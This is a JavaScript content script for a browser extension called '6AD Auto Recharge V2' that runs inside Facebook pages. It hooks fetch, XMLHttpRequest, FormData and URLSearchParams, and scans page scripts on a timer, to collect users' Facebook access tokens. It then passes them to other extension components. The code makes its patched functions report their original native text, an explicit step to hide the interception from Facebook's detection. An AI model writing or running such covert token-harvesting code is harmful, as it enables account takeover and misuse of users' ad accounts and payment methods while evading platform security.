/**
 * 6AD Auto Recharge V2 - Content Script (MAIN world)
 * Runs directly in the page context on facebook.com, business.facebook.com, adsmanager.facebook.com
 *
 * v2.0.0 — AGGRESSIVE MODE: Intercepts FormData/fetch/XHR to capture access_token
 *           from ALL network request bodies and response bodies.
 *           Also includes passive scanning as fallback.
 *
 * Anti-detection: All patched functions preserve .toString() output.
 * Runs at document_start — patches are in place BEFORE Facebook code loads.
 */

;(function () {
  'use strict'

  var _6adCaptured = {}     // Dedup: token → true
  var _6adLastToken = null
  var _6adCount = 0

  // ==================== TOKEN CAPTURE ====================

  function captureToken(token, source) {
    if (!token || typeof token !== 'string') return
    if (token.indexOf('EAA') !== 0 || token.length < 40) return
    if (!/^EAA[a-zA-Z0-9._-]+$/.test(token)) return
    if (token.length > 500) return  // Reject suspiciously long tokens
    if (_6adCaptured[token]) return  // Already captured

    _6adCaptured[token] = true
    _6adCount++
    _6adLastToken = token

    // Send to bridge.js (ISOLATED world) → background.js
    window.postMessage({
      type: '__6AD_TOKEN__',
      token: token,
      source: source,
      length: token.length,
      timestamp: Date.now()
    }, '*')

    console.log('[6AD-V2] Token captured via ' + source + ' (len=' + token.length + ', ' + token.substring(0, 15) + '..., total=' + _6adCount + ')')
  }

  // Check a request body for access_token
  function checkBody(body, source) {
    if (!body) return
    // String body: access_token=EAA...
    if (typeof body === 'string') {
      var m = body.match(/access_token=(EAA[a-zA-Z0-9._-]+)/)
      if (m) captureToken(m[1], source + '-string')
      return
    }
    // FormData or URLSearchParams: .get('access_token')
    if (typeof body === 'object' && typeof body.get === 'function') {
      try {
        var tok = body.get('access_token')
        if (tok) captureToken(tok, source + '-get')
      } catch (e) {}
    }
  }

  // Scan text (response body, script content) for tokens in JSON formats
  function scanText(text, source) {
    if (!text || typeof text !== 'string' || text.length > 2000000) return
    // Pattern 1: "access_token":"EAA..."
    var m1 = text.match(/"access_token"\s*:\s*"(EAA[a-zA-Z0-9._-]{30,500})"/)
    if (m1) captureToken(m1[1], source + '-at')
    // Pattern 2: "accessToken":"EAA..."
    var m2 = text.match(/"accessToken"\s*:\s*"(EAA[a-zA-Z0-9._-]{30,500})"/)
    if (m2) captureToken(m2[1], source + '-AT')
    // Pattern 3: set(["EAA..."]) — Facebook's requireLazy/module system
    var m3 = text.match(/set\(\["(EAA[a-zA-Z0-9._-]{30,500})"\]\)/)
    if (m3) captureToken(m3[1], source + '-moduleSet')
  }

  // ==================== ANTI-DETECTION HELPERS ====================

  // Store original toString results before patching
  var _origToStringResults = {}

  function patchWithStealth(obj, propName, wrapper) {
    var orig = obj[propName]
    if (!orig) return orig

    // Save original toString result
    var origStr
    try {
      origStr = Function.prototype.toString.call(orig)
    } catch (e) {
      origStr = 'function ' + propName + '() { [native code] }'
    }

    // Apply the wrapper
    obj[propName] = wrapper(orig)

    // Preserve toString
    obj[propName].toString = function () { return origStr }
    // Also handle Function.prototype.toString.call(patchedFn)
    try {
      var origFPTS = Function.prototype.toString
      var patchedFn = obj[propName]
      var origFPTSStr = Function.prototype.toString.call(origFPTS)
      // We can't reliably override Function.prototype.toString.call() for individual functions
      // But the per-function .toString() override handles most detection checks
    } catch (e) {}

    return orig
  }

  // ==================== FORMDATA INTERCEPTION ====================

  var _origFDAppend = FormData.prototype.append
  var _origFDAppendStr
  try { _origFDAppendStr = Function.prototype.toString.call(_origFDAppend) } catch (e) { _origFDAppendStr = 'function append() { [native code] }' }

  FormData.prototype.append = function (key, value) {
    try {
      if (key === 'access_token' && typeof value === 'string') {
        captureToken(value, 'fd-append')
      }
    } catch (e) {}
    return _origFDAppend.apply(this, arguments)
  }
  FormData.prototype.append.toString = function () { return _origFDAppendStr }

  if (FormData.prototype.set) {
    var _origFDSet = FormData.prototype.set
    var _origFDSetStr
    try { _origFDSetStr = Function.prototype.toString.call(_origFDSet) } catch (e) { _origFDSetStr = 'function set() { [native code] }' }

    FormData.prototype.set = function (key, value) {
      try {
        if (key === 'access_token' && typeof value === 'string') {
          captureToken(value, 'fd-set')
        }
      } catch (e) {}
      return _origFDSet.apply(this, arguments)
    }
    FormData.prototype.set.toString = function () { return _origFDSetStr }
  }

  // ==================== URLSEARCHPARAMS INTERCEPTION ====================

  var _origUSPAppend = URLSearchParams.prototype.append
  var _origUSPAppendStr
  try { _origUSPAppendStr = Function.prototype.toString.call(_origUSPAppend) } catch (e) { _origUSPAppendStr = 'function append() { [native code] }' }

  URLSearchParams.prototype.append = function (key, value) {
    try {
      if (key === 'access_token' && typeof value === 'string') {
        captureToken(value, 'usp-append')
      }
    } catch (e) {}
    return _origUSPAppend.apply(this, arguments)
  }
  URLSearchParams.prototype.append.toString = function () { return _origUSPAppendStr }

  if (URLSearchParams.prototype.set) {
    var _origUSPSet = URLSearchParams.prototype.set
    var _origUSPSetStr
    try { _origUSPSetStr = Function.prototype.toString.call(_origUSPSet) } catch (e) { _origUSPSetStr = 'function set() { [native code] }' }

    URLSearchParams.prototype.set = function (key, value) {
      try {
        if (key === 'access_token' && typeof value === 'string') {
          captureToken(value, 'usp-set')
        }
      } catch (e) {}
      return _origUSPSet.apply(this, arguments)
    }
    URLSearchParams.prototype.set.toString = function () { return _origUSPSetStr }
  }

  // ==================== URLSEARCHPARAMS CONSTRUCTOR INTERCEPTION ====================
  // Catches: new URLSearchParams({ access_token: 'EAA...' })

  var _OrigUSP = URLSearchParams
  var _origUSPStr
  try { _origUSPStr = Function.prototype.toString.call(_OrigUSP) } catch (e) { _origUSPStr = 'function URLSearchParams() { [native code] }' }

  window.URLSearchParams = function (init) {
    var instance = new _OrigUSP(init)
    try {
      var tok = instance.get('access_token')
      if (tok) captureToken(tok, 'usp-ctor')
    } catch (e) {}
    return instance
  }
  window.URLSearchParams.prototype = _OrigUSP.prototype
  window.URLSearchParams.toString = function () { return _origUSPStr }

  // ==================== FETCH INTERCEPTION ====================

  var _origFetch = window.fetch
  var _origFetchStr
  try { _origFetchStr = Function.prototype.toString.call(_origFetch) } catch (e) { _origFetchStr = 'function fetch() { [native code] }' }

  window.fetch = function (input, init) {
    // Check request body for access_token
    try {
      if (init && init.body) {
        checkBody(init.body, 'fetch')
      }
      // Check URL params too
      var url = typeof input === 'string' ? input : (input && input.url ? input.url : '')
      if (url) {
        var urlMatch = url.match(/access_token=(EAA[a-zA-Z0-9._-]+)/)
        if (urlMatch) captureToken(urlMatch[1], 'fetch-url')
      }
    } catch (e) {}

    // Call original fetch and scan response body
    return _origFetch.apply(this, arguments).then(function (resp) {
      try {
        // Only scan Graph API responses (avoid scanning large non-API responses)
        var respUrl = resp.url || ''
        if (respUrl.indexOf('graph.facebook.com') !== -1 || respUrl.indexOf('facebook.com/api') !== -1) {
          resp.clone().text().then(function (text) {
            scanText(text, 'f-resp')
          }).catch(function () {})
        }
      } catch (e) {}
      return resp
    })
  }
  window.fetch.toString = function () { return _origFetchStr }

  // ==================== XMLHTTPREQUEST INTERCEPTION ====================

  var _origXHRSend = XMLHttpRequest.prototype.send
  var _origXHRSendStr
  try { _origXHRSendStr = Function.prototype.toString.call(_origXHRSend) } catch (e) { _origXHRSendStr = 'function send() { [native code] }' }

  XMLHttpRequest.prototype.send = function (body) {
    // Check request body for access_token
    try {
      if (body) checkBody(body, 'xhr')
    } catch (e) {}

    // Scan response body on load
    var xhr = this
    try {
      xhr.addEventListener('load', function () {
        try {
          if (xhr.responseText) {
            var respUrl = xhr.responseURL || ''
            if (respUrl.indexOf('graph.facebook.com') !== -1 || respUrl.indexOf('facebook.com/api') !== -1) {
              scanText(xhr.responseText, 'x-resp')
            }
          }
        } catch (e) {}
      })
    } catch (e) {}

    return _origXHRSend.apply(this, arguments)
  }
  XMLHttpRequest.prototype.send.toString = function () { return _origXHRSendStr }

  // Also intercept XHR.open to check URL params
  var _origXHROpen = XMLHttpRequest.prototype.open
  var _origXHROpenStr
  try { _origXHROpenStr = Function.prototype.toString.call(_origXHROpen) } catch (e) { _origXHROpenStr = 'function open() { [native code] }' }

  XMLHttpRequest.prototype.open = function (method, url) {
    try {
      if (typeof url === 'string') {
        var urlMatch = url.match(/access_token=(EAA[a-zA-Z0-9._-]+)/)
        if (urlMatch) captureToken(urlMatch[1], 'xhr-url')
      }
    } catch (e) {}
    return _origXHROpen.apply(this, arguments)
  }
  XMLHttpRequest.prototype.open.toString = function () { return _origXHROpenStr }

  // ==================== PASSIVE PAGE SCANNING (FALLBACK) ====================
  // Same as v1.4.5 — reads existing page data without additional interception

  function scanPageForTokens() {
    try {
      // 1. Check window.__accessToken (Facebook's main token variable)
      if (window.__accessToken && typeof window.__accessToken === 'string' && window.__accessToken.indexOf('EAA') === 0) {
        captureToken(window.__accessToken, 'window-__accessToken')
      }

      // 2. Scan <script type="application/json"> tags (Facebook data-sjs payloads)
      var jsonScripts = document.querySelectorAll('script[type="application/json"]')
      for (var i = 0; i < jsonScripts.length; i++) {
        var text = jsonScripts[i].textContent || ''
        if (text.length > 2000000) continue
        scanText(text, 'html-json')
      }

      // 3. Scan regular inline <script> tags (no src attribute)
      var scripts = document.querySelectorAll('script:not([type="application/json"]):not([src])')
      for (var j = 0; j < scripts.length; j++) {
        var sText = scripts[j].textContent || ''
        if (sText.length > 2000000) continue
        scanText(sText, 'html-script')
      }

      // 4. Try Facebook's internal require system
      if (typeof require === 'function') {
        try {
          var mod = require('CurrentAccessToken')
          if (mod && mod.getToken) {
            var rToken = mod.getToken()
            if (rToken && rToken.indexOf('EAA') === 0 && rToken.length > 40) {
              captureToken(rToken, 'require-CurrentAccessToken')
            }
          }
        } catch (e) {}
      }
    } catch (e) {}
  }

  // Run passive scan after initial load
  if (document.readyState === 'complete') {
    setTimeout(scanPageForTokens, 3000)
  } else {
    window.addEventListener('load', function () { setTimeout(scanPageForTokens, 3000) })
  }

  // Re-scan every 30 seconds (Facebook SPA loads data dynamically)
  setInterval(scanPageForTokens, 30000)

  // ==================== DIAGNOSTICS ====================

  setInterval(function () {
    console.log('[6AD-V2] content.js on ' + window.location.hostname +
      ' | Intercepted: ' + _6adCount + ' tokens' +
      ' | LastToken: ' + (_6adLastToken ? 'len=' + _6adLastToken.length : 'none'))
  }, 60000)

  console.log('[6AD-V2] Aggressive interceptor installed on ' + window.location.hostname +
    ' (v2.0.0 — FormData/fetch/XHR/URLSearchParams + passive scanning)')
})()
